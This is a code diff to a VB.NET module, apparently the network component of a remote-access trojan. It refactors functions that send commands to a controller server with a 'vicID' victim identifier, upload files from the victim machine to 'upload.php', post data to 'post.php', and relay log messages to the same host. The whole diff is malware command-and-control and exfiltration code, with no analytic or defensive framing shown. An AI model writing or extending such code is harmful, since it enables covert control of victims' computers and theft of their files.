@@ -31,25 +31,29 @@ Namespace HTTPSocket
             End Try
         End Function
         Public Function _POST(ByVal requst As String)
-            Dim s As HttpWebRequest
-            Dim enc As UTF8Encoding
-            Dim postdata As String
-            Dim postdatabytes As Byte()
-            s = HttpWebRequest.Create(Host & "/" & "post.php")
-            enc = New UTF8Encoding()
-            postdata = requst
-            postdatabytes = enc.GetBytes(postdata)
-            s.Method = "POST"
-            s.ContentType = "application/x-www-form-urlencoded"
-            s.ContentLength = postdatabytes.Length
+            Try
+                Dim s As HttpWebRequest
+                Dim enc As UTF8Encoding
+                Dim postdata As String
+                Dim postdatabytes As Byte()
+                s = HttpWebRequest.Create(Host & "/" & "post.php")
+                enc = New UTF8Encoding()
+                postdata = requst
+                postdatabytes = enc.GetBytes(postdata)
+                s.Method = "POST"
+                s.ContentType = "application/x-www-form-urlencoded"
+                s.ContentLength = postdatabytes.Length
 
-            Using stream = s.GetRequestStream()
-                stream.Write(postdatabytes, 0, postdatabytes.Length)
-            End Using
-            Dim result = s.GetResponse()
-            Return result
+                Using stream = s.GetRequestStream()
+                    stream.Write(postdatabytes, 0, postdatabytes.Length)
+                End Using
+                Dim result = s.GetResponse()
+                Return result
+            Catch ex As WebException
+                Return ex.Message
+            End Try
         End Function
-        Function Send(ByVal Command As String)
+        Public Function Send(ByVal Command As String)
             Try
                 Socket.DownloadString(Host & "/" & "receive.php?command=" & ENB(Command) & "&vicID=" & ENB(ID))
                 Return True
@@ -57,8 +61,16 @@ Namespace HTTPSocket
                 Return ex.Message
             End Try
         End Function
-        Public Sub Upload(ByVal Filepath As String)
-            Socket.UploadFile(Host & "/upload.php?id=" & ENB(ID), Filepath)
+        Public Function Upload(ByVal Filepath As String)
+            Try
+                Socket.UploadFile(Host & "/upload.php?id=" & ENB(ID), Filepath)
+                Return True
+            Catch ex As Exception
+                Return ex.Message
+            End Try
+        End Function
+        Public Sub Log(ByVal Type As String, ByVal Message As String)
+            Send("NewLog" & "|BN|" & Type & "|BN|" & Message)
         End Sub
     End Class
 End Namespace
